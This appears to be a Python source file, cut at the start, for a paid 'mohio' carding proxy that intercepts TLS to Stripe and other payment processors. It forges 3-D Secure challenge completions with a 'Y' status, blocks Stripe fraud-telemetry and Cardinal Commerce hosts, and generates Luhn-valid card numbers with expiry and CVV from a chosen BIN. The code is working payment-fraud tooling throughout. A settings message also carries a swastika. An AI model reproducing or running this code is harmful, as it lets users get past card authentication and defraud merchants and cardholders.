					"messageVersion": "2.2.0",
					"sdkTransID": "",
					"threeDSServerTransID": jresbody["ares"]["threeDSServerTransID"],
					"transStatus": "Y"
				}

				stringedpayload=json.dumps(payload, separators=(',', ':'))

				challengeData+= "&final_cres="+urllib.parse.quote_plus(stringedpayload)

				res_body = requests.post("https://api.stripe.com/v1/3ds2/challenge_complete", proxies=req.getFormattedProxy(), headers=challengeHeaders, data=challengeData).text.encode("utf-8")
				print(res_body)

				"""
				fakeBody = requests.post("https://api.stripe.com/v1/3ds2/challenge_complete", proxies=req.getFormattedProxy(), headers=challengeHeaders, data=challengeData).json()
				fakeBody["ares"]["transStatus"] = "Y" # Send fake success status
				fakeBody["state"] = "succeeded" # Send fake success status
				res_body = json.dumps(fakeBody).encode("utf-8")
				print(res_body)
				"""
		except Exception as e:
			traceback.print_exc()

		req_body = req_body.encode("utf-8")

	return res_body

def isWin():
	return (True if os.name == 'nt' else False)

def generateTxnId(id_str):
	suffix = id_str.split('_')[-1]
	if len(suffix) < 7:
		return "Error: ID string is too short"
	random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=7))
	new_suffix = ''
	for i in range(len(suffix)):
		if i < len(suffix) - 7:
			new_suffix += suffix[i]
		else:
			if suffix[i].islower():
				new_suffix += random_chars[i - (len(suffix) - 7)].lower()
			else:
				new_suffix += random_chars[i - (len(suffix) - 7)].upper()
	txn_id = 'txn_' + new_suffix
	return txn_id

def deletefromarray(array, element):
	try:
		del array[element]
	except:
		pass
	return array

def parse_x_www_form_urlencoded(data):
	result = {}
	for item in data.split('&'):
		key, value = item.split('=')
		result[key] = value.replace('+', ' ').replace('%20', ' ')
	return result

def build_x_www_form_urlencoded(data):
	result = []
	for key, value in data.items():
		value = value.replace(' ', '+')
		result.append(f"{key}={value}")
	return '&'.join(result)

def gencc(U):
	while True:
		if len(U)<16:U=U+'x'
		else:break
	def C(L):
		def B(n):return[int(A)for A in str(n)]
		C=B(L);D=C[-1::-2];E=C[-2::-2];A=0;A+=sum(D)
		for F in E:A+=sum(B(F*2))
		return A%10
	def D(x,t):
		def G(aS,n):
			aS=str(aS)
			if n>=1:A=aS[-n:]
			else:A=''
			return A
		def C(aS,n,n2=None):
			A=n2;aS=str(aS)
			if A is None or A=='':A=len(aS)
			n,A=int(n),int(A)
			if n<0:n+=1
			B=aS[n-1:n-1+A];return B
		def B(x,t=1):
			x=str(x)
			if t>0:
				while len(x)>t:A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			else:
				for B in range(abs(t)):A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			return int(x)
		D=False;E='';A=1
		for H in range(1,len(x)):
			I=int(C(x,H,1))*int(C('21',A,1));E+=str(B(I));A+=1
			if A>len('21'):A=1
		F=B(E,-1)
		if(10*B(F,-1)-F)%10==int(G(x,1)):D=True
		return D
	while True:
		A=''
		for B in U:
			if len(A)<16 and'x'==B.lower():A+=str(random.randint(0,9))
			else:A+=str(B)
		if C(A)==0 and D(A,random.randint(0,9)):return A,str(random.choice(list(range(1,13)))).zfill(2),str(random.choice(list(range(datetime.date.today().year+1,datetime.date.today().year+8))))[-2:],str(random.randrange(1000)).zfill(3)

def checkcc(A,C):
	if A=="":return True
	while True:
		if len(A)<16:A=A+'x'
		else:break
	if len(A)!=len(C):return False
	for B in range(len(A)):
		if A[B]!='x'and A[B]!=C[B]:return False
	return True

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
	address_family = socket.AF_INET6
	daemon_threads = True

	def handle_error(self, request, client_address):
		# surpress socket/ssl related errors
		cls, e = sys.exc_info()[:2]
		if cls is socket.error or cls is ssl.SSLError:
			pass
		else:
			return HTTPServer.handle_error(self, request, client_address)


class ProxyRequestHandler(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		pass

	def handle(self):
		try:
			super().handle()
		except Exception as e:
			logging.debug("Exception in ProxyRequestHandler: %s", e)

	def do_CONNECT(self):
		host, _ = self.path.split(":", 1)
		self.ishttps = True
		self.hostname = host

		if not self.isAuthorized() and self.hostname != "mohio":
			self.connect_intercept()
			return

		blacklisted_domains = ["r.stripe.com", "geoissuer.cardinalcommerce.com", "geo.cardinalcommerce.com"]
		allowed_domains = ["api.stripe.com", "js.stripe.com", "m.stripe.com", "api.recurly.com", "htp.tokenex.com", "www.patreon.com", "api.checkout.com", "api.xendit.co", "iframe-api.nordpayments.com", "payments.vultr.com", "mohio"]
		try:
			if self.hostname in blacklisted_domains:
				self.send_response_only(404, "Not Found")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
			if self.hostname in allowed_domains:
				self.connect_intercept()
			else:
				self.connect_no_intercept()
		except Exception as e:
			pass

	def do_REQ(self):
		try:
			if not hasattr(self, 'ishttps'):
				self.hostname = urllib.parse.urlparse(self.path).netloc
				self.ishttps = False

			if self.hostname == "mohio":
				self.handle_custom_domain()
				return
			

			if not self.isAuthorized():
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://mohio")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return

			else:
				def create_proxy_connection(scheme, netloc):
					full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
					proxy_host = full_proxy[0]
					proxy_port = int(full_proxy[1])
					try:
						proxy_user = full_proxy[2]
					except IndexError:
						proxy_user = ""
					try:
						proxy_pass = full_proxy[3]
					except IndexError:
						proxy_pass = ""
					
					credentials = f"{proxy_user}:{proxy_pass}"
					auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"

					if scheme == "https":
						context = ssl.create_default_context()
						raw_socket = socket.create_connection((proxy_host, proxy_port))
						if proxy_user and proxy_pass:
							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\nProxy-Authorization: {auth_header}\r\n\r\n".encode())
						else:
							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\n\r\n".encode())
						response = http.client.HTTPResponse(raw_socket)
						response.begin()
						if response.status != 200:
							raise Exception("Proxy connection failed")
						conn = http.client.HTTPSConnection(netloc, context=context)
						conn.sock = context.wrap_socket(raw_socket, server_hostname=netloc)
					else:
						conn = http.client.HTTPConnection(proxy_host, proxy_port)
						conn.set_tunnel(netloc, headers={"Proxy-Authorization": auth_header})
					
					return conn

				req = self
				content_length = int(req.headers.get("Content-Length", 0))
				req_body = self.rfile.read(content_length) if content_length else b""

				if req.path[0] == "/":
					if isinstance(self.connection, ssl.SSLSocket):
						req.path = "https://%s%s" % (req.headers["Host"], req.path)
					else:
						req.path = "http://%s%s" % (req.headers["Host"], req.path)

				if request_handler is not None:
					req_body_modified = request_handler(req, req_body)
					if req_body_modified is False:
						self.send_error(403)
						return
					if req_body_modified is not None:
						req_body = req_body_modified

				def remove_key_case_insensitive(d, key_to_remove):
					key_to_remove_lower = key_to_remove.lower()
					
					keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
					
					for key in keys_to_delete:
						del d[key]

				remove_key_case_insensitive(req.headers, "Content-Length")
				req.headers["Content-Length"] = str(len(req_body))
				
				u = urllib.parse.urlsplit(req.path)
				scheme = u.scheme
				netloc = u.netloc
				path = u.path + "?" + u.query if u.query else u.path
				assert scheme in ("http", "https")
				if netloc:
					req.headers["Host"] = netloc
				req.headers = self.filter_headers(req.headers)  # type: ignore

				origin = (scheme, netloc)
				try:
					if origin not in self.tls.conns:
						self.tls.conns[origin] = create_proxy_connection(scheme, netloc)
					conn = self.tls.conns[origin]
					conn.request(self.command, path, req_body, dict(req.headers))
					res = conn.getresponse()

					# support streaming
					cache_control = res.headers.get("Cache-Control", "")
					if "Content-Length" not in res.headers and "no-store" in cache_control:
						if response_handler is not None:
							response_handler(req, req_body, res, "")
						res.headers = self.filter_headers(res.headers)
						self.relay_streaming(res)
						return

					res_body = res.read()
				except Exception as e:
					if origin in self.tls.conns:
						del self.tls.conns[origin]
					self.send_error(502)
					return

				if response_handler is not None:
					content_encoding = res.headers.get("Content-Encoding", "identity")
					res_body_plain = self.decode_content_body(res_body, content_encoding)
					res_body_modified = response_handler(req, req_body, res, res_body_plain)
					if res_body_modified is False:
						self.send_error(403)
						return
					if res_body_modified is not None:
						res_body = self.encode_content_body(res_body_modified, content_encoding)
						def remove_key_case_insensitive(d, key_to_remove):
							key_to_remove_lower = key_to_remove.lower()
							
							keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
							
							for key in keys_to_delete:
								del d[key]

						remove_key_case_insensitive(res.headers, "Content-Length")
						res.headers["Content-Length"] = str(len(res_body))

				res.headers = self.filter_headers(res.headers)

				self.send_response_only(res.status, res.reason)
				for k, v in res.headers.items():
					self.send_header(k, v)
				self.end_headers()
				self.wfile.write(res_body)
				self.wfile.flush()
		except:
			pass

	def connect_intercept(self):
		hostname = self.path.split(":")[0]
		
		with self.lock:
			key_file_name, cert_file_name = self.create_and_sign_cert(hostname, "ca-cert.pem", "ca-key.pem")

		self.send_response(200, "Connection Established")
		self.end_headers()

		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.verify_mode = ssl.CERT_NONE
		context.load_cert_chain(cert_file_name, key_file_name)

		try:
			self.connection = context.wrap_socket(self.connection, server_side=True)
		except ssl.SSLEOFError:
			return

		self.rfile = self.connection.makefile("rb", self.rbufsize)
		self.wfile = self.connection.makefile("wb", self.wbufsize)

		conntype = self.headers.get("Proxy-Connection", "")
		if self.protocol_version == "HTTP/1.1" and conntype.lower() != "close":
			self.close_connection = False
		else:
			self.close_connection = True

	def connect_no_intercept(self):
		full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
		proxy_host = full_proxy[0]
		proxy_port = int(full_proxy[1])
		try:
			proxy_user = full_proxy[2]
		except IndexError:
			proxy_user = ""
		try:
			proxy_pass = full_proxy[3]
		except IndexError:
			proxy_pass = ""

		credentials = f"{proxy_user}:{proxy_pass}"
		auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"

		remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		remote.connect((proxy_host, proxy_port))
		if proxy_user and proxy_pass:
			remote.sendall(
				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
				f"Host: {self.hostname}:443\r\n"
				f"Proxy-Authorization: {auth_header}\r\n"
				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
			)
		else:
			remote.sendall(
				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
				f"Host: {self.hostname}:443\r\n"
				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
			)

		response = http.client.HTTPResponse(remote)
		response.begin()
		if response.status != 200:
			self.send_error(502)
			return

		self.send_response(200, "Connection Established")
		self.end_headers()

		inputs = [self.connection, remote]
		while inputs:
			readable, _, _ = select.select(inputs, [], [])
			for r in readable:
				data = r.recv(4096)
				if not data:
					inputs.remove(r)
				else:
					if r is remote:
						self.connection.sendall(data)
					else:
						remote.sendall(data)

		remote.close()

	def relay_streaming(self, res):
		self.send_response_only(res.status, res.reason)
		for k, v in res.headers.items():
			self.send_header(k, v)
		self.end_headers()
		try:
			while True:
				chunk = res.read(8192)
				if not chunk:
					break
				self.wfile.write(chunk)
			self.wfile.flush()
		except socket.error:
			# connection closed by client
			pass

	def filter_headers(self, headers: HTTPMessage) -> HTTPMessage:
		# http://tools.ietf.org/html/rfc2616#section-13.5.1
		hop_by_hop = (
			"connection",
			"keep-alive",
			"proxy-authenticate",
			"proxy-authorization",
			"te",
			"trailers",
			"transfer-encoding",
			"upgrade",
		)
		for k in hop_by_hop:
			del headers[k]

		# accept only supported encodings
		if "Accept-Encoding" in headers:
			ae = headers["Accept-Encoding"]
			filtered_encodings = [
				x
				for x in re.split(r",\s*", ae)
				if x in ("identity", "gzip", "x-gzip", "deflate")
			]
			headers["Accept-Encoding"] = ", ".join(filtered_encodings)

		return headers

	do_GET = do_REQ
	do_HEAD = do_REQ
	do_POST = do_REQ
	do_PUT = do_REQ
	do_DELETE = do_REQ
	do_OPTIONS = do_REQ

	lock = threading.Lock()


	def __init__(self, *args, **kwargs):
		self.tls = threading.local()
		self.tls.conns = {}

		super().__init__(*args, **kwargs)

	def log_error(self, format, *args):
		pass

	def handle_custom_domain(self):
		if not self.ishttps:
			self.send_response_only(302, "Found")
			self.send_header("Location", "https://mohio")
			self.send_header("Content-Type", "text/html; charset=UTF-8")
			self.send_header("Content-Length", "0")
			self.end_headers()
		else:
			if self.path == "/cert.pem":
				self.send_cacert()
				return
			if self.path == "/getcreds":
				if isWin():
					getcredsf = open("site\\getcreds.html", "rb")
				else:
					getcredsf = open("site/getcreds.html", "rb")
				getcreds = getcredsf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(getcreds))
				self.end_headers()
				self.wfile.write(getcreds)
				self.wfile.flush()
				getcredsf.close()
				return
			if self.path == "/fingerprint.js":
				if isWin():
					fingerprintjsf = open("site\\fingerprint.js", "rb")
				else:
					fingerprintjsf = open("site/fingerprint.js", "rb")
				fingerprintjs = fingerprintjsf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/javascript; charset=UTF-8")
				self.send_header("Content-Length", len(fingerprintjs))
				self.end_headers()
				self.wfile.write(fingerprintjs)
				self.wfile.flush()
				fingerprintjsf.close()
				return
			if self.path == "/logs" and self.isAuthorized():
				try:
					templogs = self.getCurrentUser().get("settings").get("logs")
					while len(templogs) < 10:
						templogs.insert(0, '')
					templogs = json.dumps(templogs).encode()
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(templogs))
					self.end_headers()
					self.wfile.write(templogs)
					self.wfile.flush()
				except:
					templogs = json.dumps(['','','','','','','','','',''])
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(templogs))
					self.end_headers()
					self.wfile.write(templogs)
					self.wfile.flush()
				return
			if self.path == "/getUsername" and self.isAuthorized():
				try:
					username = self.getCurrentUser().get("username")
					username = json.dumps(username).encode()
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(username))
					self.end_headers()
					self.wfile.write(username)
					self.wfile.flush()
				except:
					username = "anonymous"
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(username))
					self.end_headers()
					self.wfile.write(username)
					self.wfile.flush()
				return
			if self.path == "/settings" and self.isAuthorized():
				if isWin():
					authorizedf = open("site\\settings.html", "rb")
				else:
					authorizedf = open("site/settings.html", "rb")
				authorized = authorizedf.read()

				try:
					authorized = authorized.replace(b"PROXYVAL", self.getCurrentUser().get("settings").get("proxy").encode())
				except:
					authorized = authorized.replace(b"PROXYVAL", b"")

				try:
					authorized = authorized.replace(b"BINVAL", self.getCurrentUser().get("settings").get("bin").encode())
				except:
					authorized = authorized.replace(b"BINVAL", b"")

				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(authorized))
				self.end_headers()
				self.wfile.write(authorized)
				self.wfile.flush()
				authorizedf.close()
				return
			if self.path == "/saveSettings" and self.isAuthorized():
				try:
					content_length = int(self.headers.get("Content-Length", 0))
					request_body = self.rfile.read(content_length) if content_length else b""
					jsonData = json.loads(request_body.decode())

					settings = self.getCurrentUser().get("settings")
					settings["proxy"] = jsonData["proxy"]
					if jsonData["bin"].startswith("409595") and self.getCurrentUser().get("username") not in bin_whitelist:
						settings["bin"] = "卐 BIN BLACKLISTED BY MOHIO STAFF 卐"
					else:
						settings["bin"] = jsonData["bin"]
					settings["imgur"] = ""
					settings["glow"] = ""
					settings["theme"] = ""
					
					userDatabase.update_one(
						{"username": self.getCurrentUser().get("username")},
						{"$set": {"settings": settings}}
					)
				except Exception as e:
					print(e)
					pass

				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", 2)
				self.end_headers()
				self.wfile.write(b"OK")
				self.wfile.flush()
				return
			elif self.path == "/bypasses" and self.isAuthorized():
				if isWin():
					bypassesf = open("site\\bypasses.html", "rb")
				else:
					bypassesf = open("site/bypasses.html", "rb")
				bypasses = bypassesf.read()
				
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(bypasses))
				self.end_headers()
				self.wfile.write(bypasses)
				self.wfile.flush()
				bypasses.close()
				return
			elif self.isAuthorized():
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://mohio/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
			if self.path == "/":
				if isWin():
					loginpagef = open("site\\loginpage.html", "rb")
				else:
					loginpagef = open("site/loginpage.html", "rb")
				loginpage = loginpagef.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(loginpage))
				self.end_headers()
				self.wfile.write(loginpage)
				self.wfile.flush()
				loginpagef.close()
				return
			if self.path == "/wrongpassword":
				if isWin():
					wrongpasswordf = open("site\\wrongpassword.html", "rb")
				else:
					wrongpasswordf = open("site/wrongpassword.html", "rb")
				wrongpassword = wrongpasswordf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(wrongpassword))
				self.end_headers()
				self.wfile.write(wrongpassword)
				self.wfile.flush()
				wrongpasswordf.close()
				return
			if self.path == "/login" and self.command == "POST":
				content_length = int(self.headers.get("Content-Length", 0))
				request_body = self.rfile.read(content_length) if content_length else b""
				jsonData = json.loads(request_body.decode())

				try:
					hashl = hashlib.sha256()
					hashl.update(jsonData["pass"].encode())
					hashedpass = hashl.hexdigest()
					if not (
						self.getUserByName(jsonData["user"]).get("password") == hashedpass
						# jsonData["fingerprint"] in self.getUserByName(jsonData["user"]).get("fingerprint")
					):
						self.send_response_only(302, "Found")
						self.send_header("Location", "https://mohio/wrongpassword")
						self.send_header("Content-Type", "text/html; charset=UTF-8")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return
				except:
					self.send_response_only(302, "Found")
					self.send_header("Location", "https://mohio/wrongpassword")
					self.send_header("Content-Type", "text/html; charset=UTF-8")
					self.send_header("Content-Length", "0")
					self.end_headers()
					return

				userDatabase.update_one(
					{"username": jsonData["user"]},
					{"$set": {"ip": self.client_address[0]}}
				)
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://mohio/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
		return

	def isAuthorized(self):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				return True
		return False
	
	def getCurrentUser(self):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				return user
		return False

	def addToLogs(self, text):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				settings = user.get("settings")

				try:
					oldlogs = user.get("settings").get("logs")
					if not isinstance(oldlogs, list):
						oldlogs = []
				except:
					oldlogs = []

				if len(oldlogs) >= 10:
					oldlogs.pop(0)

				oldlogs.append(text)
				settings["logs"] = oldlogs

				userDatabase.update_one(
					{"username": user.get("username")},
					{"$set": {"settings": settings}}
				)

	def getUserByName(self, username):
		try:
			user = userDatabase.find_one({"username": username})
			if user.get("username") == username:
				return user
			else:
				return False
		except:
			return False

	def getFormattedProxy(self):
		try:
			ip, port, user, passwd = self.getCurrentUser().get("settings").get("proxy").split(":")
			return {"http": "http://"+user+":"+passwd+"@"+ip+":"+port, "https": "http://"+user+":"+passwd+"@"+ip+":"+port}
		except:
			ip, port = self.getCurrentUser().get("settings").get("proxy").split(":")
			return {"http": "http://"+ip+":"+port, "https": "http://"+ip+":"+port} 

	def create_and_sign_cert(self, hostname, ca_cert_path, ca_key_path):
		if isWin():
			if os.path.isfile("certs\\"+str(hostname)+".key") and os.path.isfile("certs\\"+str(hostname)+".crt"):
				return "certs\\"+hostname+".key", "certs\\"+hostname+".crt"
		else:
			if os.path.isfile("certs/"+str(hostname)+".key") and os.path.isfile("certs/"+str(hostname)+".crt"):
				return "certs/"+hostname+".key", "certs/"+hostname+".crt"

		with open(ca_cert_path, "rb") as ca_cert_file:
			ca_cert = x509.load_pem_x509_certificate(ca_cert_file.read(), default_backend())
		with open(ca_key_path, "rb") as ca_key_file:
			ca_key = serialization.load_pem_private_key(ca_key_file.read(), password=None, backend=default_backend())
			
		domain_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())

		csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
			x509.NameAttribute(NameOID.COMMON_NAME, hostname)
		])).add_extension(
			x509.SubjectAlternativeName([x509.DNSName(hostname)]),
			critical=False
		).sign(domain_key, hashes.SHA256(), default_backend())
		
		domain_cert = x509.CertificateBuilder().subject_name(
			csr.subject
		).issuer_name(
			ca_cert.subject
		).public_key(
			csr.public_key()
		).serial_number(
			x509.random_serial_number()
		).not_valid_before(
			datetime.datetime.utcnow() - datetime.timedelta(days=1)
		).not_valid_after(
			datetime.datetime.utcnow() + datetime.timedelta(days=3650)
		).add_extension(
			x509.SubjectAlternativeName([x509.DNSName(hostname)]),
			critical=False
		).sign(ca_key, hashes.SHA256(), default_backend())
		
		if isWin():
			key_file = open("certs\\"+str(hostname)+".key", "wb+")
			cert_file = open("certs\\"+str(hostname)+".crt", "wb+")
		else:
			key_file = open("certs/"+str(hostname)+".key", "wb+")
			cert_file = open("certs/"+str(hostname)+".crt", "wb+")
		
		key_file.write(domain_key.private_bytes(
			encoding=Encoding.PEM,
			format=PrivateFormat.TraditionalOpenSSL,
			encryption_algorithm=NoEncryption()
		))
		
		cert_file.write(domain_cert.public_bytes(Encoding.PEM))
		
		key_file.close()
		cert_file.close()
		
		return key_file.name, cert_file.name

	def encode_content_body(self, text: bytes, encoding: str) -> bytes:
		if encoding == "identity":
			data = text
		elif encoding in ("gzip", "x-gzip"):
			data = gzip.compress(text)
		elif encoding == "deflate":
			data = zlib.compress(text)
		elif encoding == "br":
			data = brotli.compress(text)
		else:
			raise Exception("Unknown Content-Encoding: %s" % encoding)
		return data

	def decode_content_body(self, data: bytes, encoding: str) -> bytes:
		if encoding == "identity":
			text = data
		elif encoding in ("gzip", "x-gzip"):
			text = gzip.decompress(data)
		elif encoding == "deflate":
			try:
				text = zlib.decompress(data)
			except zlib.error:
				text = zlib.decompress(data, -zlib.MAX_WBITS)
		elif encoding == "br":
			text = brotli.decompress(data)
		else:
			raise Exception("Unknown Content-Encoding: %s" % encoding)
		return text
		
	def send_cacert(self):
		with open("ca-cert.pem", "rb") as f:
			data = f.read()

		self.send_response(200, "OK")
		self.send_header("Content-Type", "application/x-x509-ca-cert")
		self.send_header("Content-Length", str(len(data)))
		self.send_header("Connection", "close")
		self.end_headers()
		self.wfile.write(data)

http.server.test(
	HandlerClass=ProxyRequestHandler,
	ServerClass=ThreadingHTTPServer,
	protocol="HTTP/1.1",
	port=2966,
	bind="0.0.0.0",
)
